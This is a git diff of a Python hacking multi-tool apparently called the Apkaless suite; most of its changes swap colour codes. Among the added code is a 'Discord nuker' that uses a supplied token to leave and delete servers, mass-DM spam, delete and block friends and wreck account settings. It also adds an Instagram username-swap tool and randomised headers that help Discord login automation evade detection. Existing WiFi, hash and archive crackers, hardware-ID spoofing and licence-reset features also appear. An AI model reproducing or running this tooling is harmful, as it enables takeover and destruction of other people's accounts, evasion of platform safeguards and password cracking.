                 print(f"{green}[+] {white}HWID generated and added to report{white}")
             else:
                 f.write("Hardware ID: FAILED TO GENERATE\n\n")
-                print(f"{red}[-] {white}Failed to generate HWID{white}")
+                print(f"{lcyan}[-] {white}Failed to generate HWID{white}")
             
             # Get detailed info
             f.write("DETAILED HARDWARE INFORMATION\n")
@@ -2510,11 +3091,11 @@ def generate_hwid_report():
             print(f"{green}[+] {white}File size: {cyan}{file_size:,} bytes{white}")
             return full_path
         else:
-            print(f"{red}[-] {white}Error: File was not created{white}")
+            print(f"{lcyan}[-] {white}Error: File was not created{white}")
             return None
         
     except Exception as e:
-        print(f"{red}[-] {white}Error generating HWID report: {e}{white}")
+        print(f"{lcyan}[-] {white}Error generating HWID report: {e}{white}")
         import traceback
         traceback.print_exc()
         return None
@@ -2526,7 +3107,7 @@ def crack_wifi(dictionary):
             wifi = pywifi.PyWiFi()
             iface = wifi.interfaces()[0]
         except:
-            print(f'{red}\n[-] No WIFI Interface Ensured.')
+            print(f'{lcyan}\n[-] No WIFI Interface Ensured.')
             time.sleep(3)
             enhanced_main()
 
@@ -2633,7 +3214,7 @@ def machineID_spoofer():
                 if 'The operation completed successfully.' in query:
                     print(f'\n{green}[+] Display ID Spoofed Successfully !')
                 else:
-                    print(f'\n{red}[-] Display ID Spoofed Failed !')
+                    print(f'\n{lcyan}[-] Display ID Spoofed Failed !')
 
     def spoof_gpu():
 
@@ -2684,10 +3265,10 @@ def machineID_spoofer():
                     statue = False
             except Exception as e:
                 if 'ProductId' in str(e):
-                    print(f'\n{red}[!] Couldn\'t Spoof ProductId !')
+                    print(f'\n{lcyan}[!] Couldn\'t Spoof ProductId !')
                     statue = True
                 elif 'HwProfileGuid' in str(e):
-                    print(f'\n{red}[!] Couldn\'t Spoof HwProfileGuid !')
+                    print(f'\n{lcyan}[!] Couldn\'t Spoof HwProfileGuid !')
                     statue = True
 
                 else:
@@ -2711,7 +3292,7 @@ def machineID_spoofer():
     if set_registry_keys(registry_keys):
         spoof_display_id()
         spoof_gpu()
-        os.chdir(path_to_assistfolder)
+        os.chdir(path_to_go)
         os.chdir('tools')
         os.chdir('hwids')
         mainfile = os.listdir()[0]
@@ -2801,7 +3382,7 @@ def enhanced_proxy_gen():
         try:
             from pytools.proxy_manager import ProxyManager
         except ImportError:
-            print(f'{red}[-] proxy modules not found. Using legacy proxy generation...{rescolor}')
+            print(f'{lcyan}[-] proxy modules not found. Using legacy proxy generation...{rescolor}')
             legacy_proxy_gen()
             return
         
@@ -2845,7 +3426,7 @@ def enhanced_proxy_gen():
                 
                 print(f'{green}[+] Scraped {len(proxies)} proxies and saved to {output_dir}/{rescolor}')
             else:
-                print(f'{red}[-] No proxies found{rescolor}')
+                print(f'{lcyan}[-] No proxies found{rescolor}')
         
         elif choice == '3':
             # Check existing file
@@ -2858,9 +3439,9 @@ def enhanced_proxy_gen():
                     working_count = len([r for r in results if r.is_working])
                     print(f'{green}[+] Found {working_count} working proxies out of {len(results)} tested{rescolor}')
                 else:
-                    print(f'{red}[-] No proxies found in file{rescolor}')
+                    print(f'{lcyan}[-] No proxies found in file{rescolor}')
             else:
-                print(f'{red}[-] File not found: {proxy_file}{rescolor}')
+                print(f'{lcyan}[-] File not found: {proxy_file}{rescolor}')
         
         elif choice == '4':
             # Interactive manager
@@ -2870,11 +3451,11 @@ def enhanced_proxy_gen():
             return
         
         else:
-            print(f'{red}[-] Invalid option{rescolor}')
+            print(f'{lcyan}[-] Invalid option{rescolor}')
         
     except Exception as e:
         logger.error(f"proxy generation error: {e}")
-        print(f'{red}[-] Error in proxy generation: {e}{rescolor}')
+        print(f'{lcyan}[-] Error in proxy generation: {e}{rescolor}')
         print(f'{yellow}[!] Falling back to legacy proxy generation...{rescolor}')
         legacy_proxy_gen()
     
@@ -2920,7 +3501,7 @@ def legacy_proxy_gen():
             file.writelines([proxy, '\n'])
             file.close()
     print(
-        f'\n{green}[+] Total Proxies: {white}{b}\n{green}[+]{red} {b - a} Duplicated Proxies {green}Has Been Removed.\n{green}[+] Saved Into: {white}Scraped_proxies.txt')
+        f'\n{green}[+] Total Proxies: {white}{b}\n{green}[+]{lcyan} {b - a} Duplicated Proxies {green}Has Been Removed.\n{green}[+] Saved Into: {white}Scraped_proxies.txt')
 
 def proxy_gen():
     """Main proxy generation function - now uses enhanced version"""
@@ -2941,7 +3522,7 @@ def enhanced_proxy_check(prx_list):
         try:
             from pytools.proxy_manager import ProxyManager
         except ImportError:
-            print(f'{red}[-] proxy manager not found. Using legacy proxy checking...{rescolor}')
+            print(f'{lcyan}[-] proxy manager not found. Using legacy proxy checking...{rescolor}')
             legacy_proxy_check(prx_list)
             return
         
@@ -2952,7 +3533,7 @@ def enhanced_proxy_check(prx_list):
         proxies = proxy_manager.checker.load_proxies_from_file(prx_list)
         
         if not proxies:
-            print(f'{red}[-] No proxies found in {prx_list}{rescolor}')
+            print(f'{lcyan}[-] No proxies found in {prx_list}{rescolor}')
             return
         
         print(f'{green}[+] Loaded {len(proxies)} proxies from {prx_list}{rescolor}')
@@ -2974,7 +3555,7 @@ def enhanced_proxy_check(prx_list):
         
     except Exception as e:
         logger.error(f"proxy checking error: {e}")
-        print(f'{red}[-] Error in proxy checking: {e}{rescolor}')
+        print(f'{lcyan}[-] Error in proxy checking: {e}{rescolor}')
         print(f'{yellow}[!] Falling back to legacy proxy checking...{rescolor}')
         legacy_proxy_check(prx_list)
 
@@ -3023,7 +3604,7 @@ def legacy_proxy_check(prx_list):
             threds.append(th)
 
             print(
-                f'\r{green}Http({len(http_proxies)}) :: {cyan}Socks4({len(socks4_proxies)}) :: {lmagenta}Socks5({len(socks5_proxies)}) :: {red}Errors({len(errors)})',
+                f'\r{green}Http({len(http_proxies)}) :: {cyan}Socks4({len(socks4_proxies)}) :: {lmagenta}Socks5({len(socks5_proxies)}) :: {lcyan}Errors({len(errors)})',
                 end='   ')
 
 def proxy_check(prx_list):
@@ -3032,6 +3613,7 @@ def proxy_check(prx_list):
             
 
 def discordHunter(email, password):
+    from pytools.uagen import GetRandomUA
     def internetChecker():
         print('\n[!] Checking Your Connection To The Internet ...\n')
         try:
@@ -3057,18 +3639,39 @@ def discordHunter(email, password):
         users = [username2, username3, username5, username6, username8, username9, username11, username12]
         return users
 
+    def super_prop_gen(useragent):
+        data = {
+            "os": "Windows",
+            "browser": "Chrome",
+            "device": "",
+            "system_locale": "en-US",
+            "browser_user_agent": f"{useragent}",
+            "browser_version": "123.0.0.0",
+            "os_version": "10",
+            "referrer": "",
+            "referring_domain": "",
+            "referrer_current": "",
+            "referring_domain_current": "",
+            "release_channel": "stable",
+            "client_build_number": 284210,
+            "client_event_source": 'null'
+            }
+    
+        return base64.b64encode(json.dumps(data).encode()).decode()
+        
     def dominator(email, password):
         os.system('cls')
         with cloudscraper.create_scraper(debug=False) as s:
+            random_useragent = GetRandomUA()
             login_url = 'https://discord.com/api/v9/auth/login'
             headers = {
                 'Accept': '*/*',
                 'Content-Type': 'application/json',
                 'Origin': 'https://discord.com',
                 'Referer': 'https://discord.com/login',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+                'User-Agent': f'{random_useragent}',
                 'X-Fingerprint': '1217540505496453165.T6xcPKVjXPtiJR3NoT8BoojkmJY',
-                'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI3NDM4OCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
+                'X-Super-Properties': f'{super_prop_gen(random_useragent)}'
             }
             data = {
                 'captcha_key': 'null',
@@ -3081,8 +3684,9 @@ def discordHunter(email, password):
             try:
                 saved_cookies = res.cookies
                 token = res.json()['token']
+                print(f'{green}[+] Token: {token}')
             except:
-                print(f'\n{red}[-] Invalid Account Information\n')
+                print(f'\n{lcyan}[-] Invalid Account Information\n')
                 time.sleep(3)
                 exit(0)
             print(f'{green}[+] Login Success !\n')
@@ -3104,10 +3708,9 @@ def discordHunter(email, password):
                 usersList = randomUser()
                 try:
                     for username in usersList:
-
+                        random_useragent2 = GetRandomUA()
                         if len(globalFalse) > 0:
                             username = globalFalse.pop(0)
-
                             globalFalse.clear()
 
                         print(fr'''{cyan}
@@ -3120,13 +3723,13 @@ def discordHunter(email, password):
 
             {yellow}[!] Checking User      : [{white}{username}{yellow}]
             {green}[+] Captured Users     : [{white}{len(capturedUsers)}{green}]
-            {red}[-] Unavailable Users  : [{white}{len(falseUsers)}{red}]
+            {lcyan}[-] Unavailable Users  : [{white}{len(falseUsers)}{lcyan}]
             {cyan}[!] Total Checked Users: [{white}{len(checkedUsers)}{cyan}]
             {yellow}[::] {green}{random.choice(ranText)}
 
                         ''')
-                        counter += 1
 
+                        counter += 1
                         data2 = {
                             'password': f"{password}",
                             'username': f"{username}"
@@ -3138,13 +3741,14 @@ def discordHunter(email, password):
                             'Content-Type': 'application/json',
                             'Origin': 'https://discord.com',
                             'Referer': 'https://discord.com/login',
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-                            'X-Fingerprint': '&',
-                            'X-Super-Properties': '&'
+                            'User-Agent': f'{random_useragent2}',
+                            'X-Fingerprint': '1217540505496453165.T6xcPKVjXPtiJR3NoT8BoojkmJY',
+                            'X-Super-Properties': f'{super_prop_gen(random_useragent2)}'
                         }
 
                         user = s.patch('https://discord.com/api/v9/users/@me', headers=headers2, json=data2,
                                        cookies=saved_cookies)
+
                         if 'code' in user.json():
                             falseUsers.append(username)
                             checkedUsers.append(username)
@@ -3162,6 +3766,7 @@ def discordHunter(email, password):
                             # print(f'\n{counter}) Flagged User ===> {username}\n====================\n')
                             globalFalse.append(username)
                             time.sleep(2)
+                        time.sleep(1)
                         os.system('cls')
                 except IndexError:
                     continue
@@ -3179,6 +3784,7 @@ def url_masking():
     instagram = 'https://instagram.com/apkaless'
     region = 'IRAQ'
     red = Fore.RED
+    darkred = Fore.LIGHTRED_EX
     green = Fore.GREEN
     yellow = Fore.YELLOW
     white = Fore.WHITE
@@ -3275,7 +3881,7 @@ def url_masking():
                     if element.attrs['id'] == 'shortenurl':
                         return element['value']
             else:
-                print(f'\n{red}[+] Try Again After 5 Minutes\n')
+                print(f'\n{lcyan}[+] Try Again After 5 Minutes\n')
                 input('\n')
                 sys.exit(1)
 
@@ -3312,7 +3918,7 @@ def url_masking():
                     url = short_url_(url)
                     break
                 else:
-                    print(f'{red}\nPlease Select Option From Above.')
+                    print(f'{lcyan}\nPlease Select Option From Above.')
             except Exception as e:
                 sleep(1)
                 continue
@@ -3344,11 +3950,12 @@ def url_masking():
     input('\n\n')
 
 def remove_tools():
-    os.chdir(path_to_assistfolder)
+    os.chdir(path_to_go)
     shutil.rmtree('tools')
 
 def enhanced_py2exe(fpath, icpath):
     """Enhanced Python to EXE converter with better error handling and user experience"""
+    from pytools.module_installer import install_requirements_lib
     os.system('cls')
     os.chdir(tool_parent_dir)
     
@@ -3359,7 +3966,7 @@ def enhanced_py2exe(fpath, icpath):
     try:
         # Validate input files
         if not os.path.exists(fpath):
-            print(f'{red}[-] Python file not found: {fpath}{rescolor}')
+            print(f'{lcyan}[-] Python file not found: {fpath}{rescolor}')
             return False
         
         if icpath and not os.path.exists(icpath):
@@ -3380,7 +3987,7 @@ def enhanced_py2exe(fpath, icpath):
                                                   stderr=subprocess.STDOUT, text=True, timeout=10)
             print(f'{green}[+] Python found:{white} {python_version.strip()}{rescolor}')
         except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
-            print(f'{red}[-] Python not found or not accessible{rescolor}')
+            print(f'{lcyan}[-] Python not found or not accessible{rescolor}')
             print(f'{yellow}[!] Attempting to install Python...{rescolor}')
             
             try:
@@ -3394,17 +4001,18 @@ def enhanced_py2exe(fpath, icpath):
                 print(f'{yellow}[!] Installing Python (this may take a few minutes)...{rescolor}')
                 
                 # Install Python silently
-                subprocess.check_output('python_installer.exe /quiet InstallAllUsers=1 PrependPath=1', 
+                subprocess.check_output('python_installer.exe /quiet InstallAllUsers=1 InstallLauncherAllUsers=1 PrependPath=1 Include_test=0', 
                                       shell=True, timeout=300)
                 
                 print(f'{green}[+] Python installed successfully{rescolor}')
-                
+
                 # Clean up installer
                 if os.path.exists('python_installer.exe'):
                     os.remove('python_installer.exe')
-                    
+                input(f'\n{green}[+] Press ENTER To Restart The Tool')
+                sys.exit(1)    
             except Exception as e:
-                print(f'{red}[-] Failed to install Python: {e}{rescolor}')
+                print(f'{lcyan}[-] Failed to install Python: {e}{rescolor}')
                 print(f'{yellow}[!] Please install Python manually and try again{rescolor}')
                 return False
         
@@ -3419,8 +4027,10 @@ def enhanced_py2exe(fpath, icpath):
             try:
                 subprocess.check_output('pip install pyinstaller', shell=True, timeout=120)
                 print(f'{green}[+] PyInstaller installed successfully{rescolor}')
+                input(f'\n{green}[+] Press ENTER To Restart The Tool')
+                sys.exit(1)    
             except Exception as e:
-                print(f'{red}[-] Failed to install PyInstaller: {e}{rescolor}')
+                print(f'{lcyan}[-] Failed to install PyInstaller: {e}{rescolor}')
                 return False
         
         # Check/Install additional dependencies
@@ -3500,7 +4110,10 @@ def enhanced_py2exe(fpath, icpath):
         print(f'{cyan}[!] This may take several minutes depending on your file size...{rescolor}')
         
         start_time = time.time()
-        
+        # find third-party libs
+        if install_requirements_lib(fpath):
+            print('Intsalling requirements from requirements_autogen.txt')
+            subprocess.check_output('pip install -r requirements_autogen.txt', shell=True, text=True, stderr=subprocess.STDOUT)
         # Construct PyInstaller command
         cmd = f'pyinstaller {" ".join(build_options)} "{fpath}"'
         print(f'{cyan}[!] Command: {cmd}{rescolor}')
@@ -3529,7 +4142,7 @@ def enhanced_py2exe(fpath, icpath):
                     if any(keyword in output.lower() for keyword in ['building', 'analyzing', 'compiling', 'linking']):
                         print(f'{cyan}[!] {output.strip()}{rescolor}')
                     elif 'error' in output.lower():
-                        print(f'{red}[-] {output.strip()}{rescolor}')
+                        print(f'{lcyan}[-] {output.strip()}{rescolor}')
                     elif 'warning' in output.lower():
                         print(f'{yellow}[!] {output.strip()}{rescolor}')
             
@@ -3580,26 +4193,26 @@ def enhanced_py2exe(fpath, icpath):
                         
                         return True
                     else:
-                        print(f'{red}[-] No executable files found in dist folder{rescolor}')
+                        print(f'{lcyan}[-] No executable files found in dist folder{rescolor}')
                         return False
                         
                 except Exception as e:
-                    print(f'{red}[-] Error accessing dist folder: {e}{rescolor}')
+                    print(f'{lcyan}[-] Error accessing dist folder: {e}{rescolor}')
                     return False
                     
             else:
-                print(f'\n{red}[-] Build failed with return code: {return_code}{rescolor}')
+                print(f'\n{lcyan}[-] Build failed with return code: {return_code}{rescolor}')
                 return False
                 
         except Exception as e:
-            print(f'\n{red}[-] Build error: {e}{rescolor}')
+            print(f'\n{lcyan}[-] Build error: {e}{rescolor}')
             return False
             
     except KeyboardInterrupt:
         print(f'\n{cyan}[!] Build interrupted by user{rescolor}')
         return False
     except Exception as e:
-        print(f'\n{red}[-] Unexpected error: {e}{rescolor}')
+        print(f'\n{lcyan}[-] Unexpected error: {e}{rescolor}')
         return False
     finally:
         # Return to original directory
@@ -3608,9 +4221,224 @@ def enhanced_py2exe(fpath, icpath):
         except:
             pass
 
+def discord_nuker():
+    """Discord Nuker Tool Menu"""
+    import os
+    os.system('cls')
+    
+    try:
+        from pytools.DisNuke.Mass_dm import massDM
+        from pytools.DisNuke.Fuck_account import fuckAccount
+        from pytools.DisNuke.Leave_server import leaveServer
+        from pytools.DisNuke.delete_server import deleteServers
+        from pytools.DisNuke.delete_friends import deleteFriends
+        from pytools.DisNuke.close_dms import close_all_dms
+        from pytools.DisNuke.block_friends import blockAllFriends
+    except ImportError as e:
+        print(f'{lcyan}[-] Error importing Discord Nuker modules: {e}{rescolor}')
+        input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+        return
+    
+    while True:
+        os.system('cls')
+        print(f'\n{darkred}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
+        print(f'{lcyan}║                                      {lcyan}☢️ BRUTAL DISCORD NUKE ☢️{lcyan}                                       ║')
+        print(f'{darkred}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
+        print(f'{darkred}║  {lcyan}[1]{white} ☠️ Complete Account Nuke           {lcyan}[2]{white} 💣 Mass DM Spam{darkred}                                          ║')
+        print(f'{darkred}║  {lcyan}[3]{white} 🚪 Leave All Servers               {lcyan}[4]{white} 🗑️ Delete Owned Servers{lcyan}                                  ║')
+        print(f'{lcyan}║  {lcyan}[5]{white} 👥 Delete All Friends              {lcyan}[6]{white} 📱 Close All DMs{darkred}                                         ║')
+        print(f'{lcyan}║  {lcyan}[7]{white} 🚫 Block All Friends               {lcyan}[8]{white} 🔧 Fuck Account Settings{lcyan}                                 ║')
+        print(f'{darkred}║  {lcyan}[0]{white} 💀 Return to Main Menu{darkred}                                                                          ║')
+        print(f'{darkred}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
+        
+        choice = input(f'\n{lcyan}[💀] SELECT BRUTAL OPTION:{white} ')
+        
+        if choice == '0':
+            break
+            
+        elif choice == '1':
+            try:
+                token = input(f'\n{lcyan}[💀] DISCORD TOKEN:{white} ')
+                if not token:
+                    print(f'\n{lcyan}[-] Token cannot be empty!{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    continue
+                
+                confirm = input(f'\n{lcyan}[💀] ARE YOU SURE YOU WANT TO BRUTALLY NUKE THIS ACCOUNT? (yes/no):{white} ')
+                if confirm.lower() == 'yes':
+                        # Leave all servers
+                        leaveServer(token)
+                        time.sleep(1)
+                        
+                        # Delete owned servers
+                        deleteServers(token)
+                        time.sleep(1)
+                        
+                        # Send mass DM
+                        massDM(token, "Nuked By Apkaless")
+                        time.sleep(1)
+                        
+                        # Delete all friends
+                        deleteFriends(token)
+                        time.sleep(1)
+                        
+                        # Close all DMs
+                        close_all_dms(token)
+                        time.sleep(1)
+                        
+                        # Fuck account settings
+                        fuckAccount(token)
+                        
+                        print(f"\n{Fore.GREEN}[+] Discord Account Nuke Complete!{Fore.RESET}")
+                else:
+                    print(f'\n{yellow}[!] Operation cancelled.{rescolor}')
+                    
+            except Exception as e:
+                print(f'\n{lcyan}[-] Account nuke failed: {e}{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+        elif choice == '2':
+            try:
+                token = input(f'\n{lcyan}[💀] DISCORD TOKEN:{white} ')
+                message = input(f'\n{lcyan}[💀] MESSAGE TO SEND:{white} ')
+                if not token or not message:
+                    print(f'{lcyan}[-] Token and message cannot be empty!{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    continue
+                
+                massDM(token, message)
+            except Exception as e:
+                print(f'\n{lcyan}[-] Mass DM failed: {e}{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+        elif choice == '3':
+            try:
+                token = input(f'\n{lcyan}[💀] DISCORD TOKEN:{white} ')
+                if not token:
+                    print(f'\n{lcyan}[-] Token cannot be empty!{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    continue
+                
+                leaveServer(token)
+            except Exception as e:
+                print(f'\n{lcyan}[-] Leave servers failed: {e}{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+        elif choice == '4':
+            try:
+                token = input(f'\n{lcyan}[💀] DISCORD TOKEN:{white} ')
+                if not token:
+                    print(f'\n{lcyan}[-] Token cannot be empty!{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    continue
+                
+                deleteServers(token)
+            except Exception as e:
+                print(f'\n{lcyan}[-] Delete servers failed: {e}{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+        elif choice == '5':
+            try:
+                token = input(f'\n{lcyan}[💀] DISCORD TOKEN:{white} ')
+                if not token:
+                    print(f'\n{lcyan}[-] Token cannot be empty!{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    continue
+                
+                deleteFriends(token)
+            except Exception as e:
+                print(f'\n{lcyan}[-] Delete friends failed: {e}{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+        elif choice == '6':
+            try:
+                token = input(f'\n{lcyan}[💀] DISCORD TOKEN:{white} ')
+                if not token:
+                    print(f'\n{lcyan}[-] Token cannot be empty!{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    continue
+                
+                close_all_dms(token)
+            except Exception as e:
+                print(f'\n{lcyan}[-] Close DMs failed: {e}{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+        elif choice == '7':
+            try:
+                token = input(f'\n{lcyan}[💀] DISCORD TOKEN:{white} ')
+                if not token:
+                    print(f'\n{lcyan}[-] Token cannot be empty!{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    continue
+                
+                blockAllFriends(token)
+            except Exception as e:
+                print(f'\n{lcyan}[-] Block friends failed: {e}{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+        elif choice == '8':
+            try:
+                token = input(f'\n{lcyan}[💀] DISCORD TOKEN:{white} ')
+                if not token:
+                    print(f'\n{lcyan}[-] Token cannot be empty!{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    continue
+                
+                fuckAccount(token)
+            except Exception as e:
+                print(f'\n{lcyan}[-] Fuck account failed: {e}{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+        else:
+            print(f'\n{lcyan}[-] Invalid option!{rescolor}')
+            input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+
+
+
+def ig_swap():
+    try:
+        os.system('cls')
+        from pytools.igswap.getSessionid import IG_LOGIN
+        from pytools.igswap.Swap import login
+        print(f"{darkred}╔══════════════════════════════════════════════════════════════════════════════╗")
+        print(f"{lcyan}║                       {lcyan}💀 BRUTAL INSTAGRAM SWAP TOOL 💀{lcyan}                       ║")
+        print(f"{darkred}╠══════════════════════════════════════════════════════════════════════════════╣")
+        print(f"{lcyan}║                        [1]{white} 🔍 Get Instagram Session ID{lcyan}                       ║")                                       
+        print(f"{lcyan}║                        [2]{white} 🔧 Run Swap tool{lcyan}                                  ║")
+        print(f"{lcyan}║                        [0]{white} 💀 Back to Main Menu{lcyan}                              ║")
+        print(f"{darkred}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}")
+
+        sub_choice = input(f'\n{lcyan}[💀] SELECT BRUTAL OPTION:{white} ')
+
+        if sub_choice == '0':
+            pass
+        elif sub_choice == '1':
+            try:
+                IG_LOGIN()
+            except Exception as e:
+                print(f"\n{lcyan}[-] Failed to run Get Session ID: {e}{rescolor}")
+            input(f"\n{blue}[!] {green}Press Enter to continue...{rescolor}")
+        elif sub_choice == '2':
+            try:
+                SESS = str(input(f"\n{lcyan}[💀] Session ID:{white} "))
+                targetIGUser = input(f"\n{lcyan}[💀] Enter Your Target Username:{white} ")
+                if login(SESS, targetIGUser):
+                    print(f'\n{lcyan}[✅] Done, Username Swapped')
+                else:
+                    print(f'\n{lcyan}[❌] Error')
+            except Exception as e:
+                print(f"\n{lcyan}[-] Failed to run Swap tool: {e}{rescolor}")
+            input(f"\n{blue}[!] {green}Press Enter to continue...{rescolor}")
+        else:
+            print(f"\n{lcyan}[-] Invalid option. Choose 0-2.{rescolor}")
+            time.sleep(1)
+    except Exception as e:
+        print(f"\n{lcyan}[-] Instagram tools failed: {e}{rescolor}")
+        input(f"\n{blue}[!] {green}Press Enter to continue...{rescolor}")
+
 def enhanced_main():
     global username, hwid, hash_type
-    os.chdir(path_to_assistfolder)
+    os.chdir(path_to_go)
     try:
         while True:
             os.system('cls')
@@ -3631,60 +4459,56 @@ def enhanced_main():
                 memory_percent = 0
                 disk_percent = 0
             
-            # Modern Banner with System Status
-            print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
-            print(f'{cyan}║                                    {lcyan}🚀 APKALESS MULTI-TOOL SUITE 🚀{cyan}                                   ║')
-            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
-            print(f'{cyan}║  {lcyan}👤 User:{white} {username:<12} {lcyan}🕐 Time:{white} {current_time:<12} {lcyan}📅 Date:{white} {current_date:<29}{cyan}                  ║')
-            print(f'{cyan}║  {lcyan}💻 CPU:{white} {cpu_percent:>3.0f}%{cyan} {' ' * 8} {lcyan}🧠 RAM:{white} {memory_percent:>3.0f}%{cyan} {' ' * 8} {lcyan}💾 Disk:{white} {disk_percent:>3.0f}%{cyan} {' ' * 8}                                  ║')
-            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
+            # BRUTAL Banner with System Status
+            print(fr"""{lcyan}
+                     █████╗ ██████╗ ██╗  ██╗ █████╗ ██╗     ███████╗███████╗███████╗
+                    ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██║     ██╔════╝██╔════╝██╔════╝
+                    ███████║██████╔╝█████╔╝ ███████║██║     █████╗  ███████╗███████╗
+                    ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║     ██╔══╝  ╚════██║╚════██║
+                    ██║  ██║██║     ██║  ██╗██║  ██║███████╗███████╗███████║███████║
+                    ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝                                                                                                  
+            """)
+            # BRUTAL Menu Categories
+            print(f'\n{darkred}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
+            print(f'{darkred}║                                    {lcyan}⚡ BRUTAL SYSTEM TOOLS ⚡{darkred}                                         ║')
+            print(f'{darkred}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
+            print(f'{darkred}║  {lcyan}[01]{white} 🎭 System Spoofer              {lcyan}[02]{white} ⚙️ System Tweaker                {lcyan}[03]{white} 📊 System Information{darkred}║')
+            print(f'{lcyan}║  {lcyan}[04]{white} 🔓 Activate Windows            {lcyan}[05]{white} ⚡ Network Optimizer             {lcyan}[06]{white} 🐍 Python To EXE{lcyan}     ║')
+            print(f'{darkred}║  {lcyan}[07]{white} 🔍 Get HWID                    {lcyan}[08]{white} 🗑️ Clean Temp Files {darkred}             {lcyan}[09]{white} 💀 IDM Trial Reset{lcyan}   ║')
+            print(f'{darkred}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
             
-            # Main Menu Categories
-            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
-            print(f'{cyan}║                                    {lcyan}🔧 SYSTEM TOOLS & UTILITIES{cyan}                                       ║')
-            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
-            print(f'{cyan}║  {lcyan}[01]{white} IDM Trial Reset                 {lcyan}[02]{white} Clean Temp Files                  {lcyan}[03]{white} Activate Windows{cyan}   ║')
-            print(f'{cyan}║  {lcyan}[04]{white} Network Optimizer               {lcyan}[05]{white} System Information                {lcyan}[06]{white} Python To EXE{cyan}      ║')
-            print(f'{cyan}║  {lcyan}[07]{white} Get HWID                        {lcyan}[08]{white} System Spoofer{cyan}                    {lcyan}[09]{white} System Tweaker{cyan}     ║')
-            print(f'{cyan}║                                                                                                      ║')
-            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
+            print(f'\n{darkred}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
+            print(f'{darkred}║                                    {lcyan}🔪 CRACKING & DESTRUCTION 🔪{darkred}                                      ║')
+            print(f'{darkred}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
+            print(f'{lcyan}║  {lcyan}[10]{white} 🔨 Hash Cracker                 {lcyan}[11]{white} 🗜️ 7z File Cracker                {lcyan}[12]{white} 📦 ZIP File Cracker{darkred}║')
+            print(f'{lcyan}║  {lcyan}[13]{white} 📡 Show Saved WiFi Passwords    {lcyan}[14]{white} 📝 Fastest Wordlist Generator     {lcyan}[15]{white} 📡 WiFi Cracker{darkred}    ║')
+            print(f'{darkred}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
             
-            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
-            print(f'{cyan}║                                    {lcyan}🔐 PASSWORD CRACKING & SECURITY{cyan:}                                   ║')
-            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
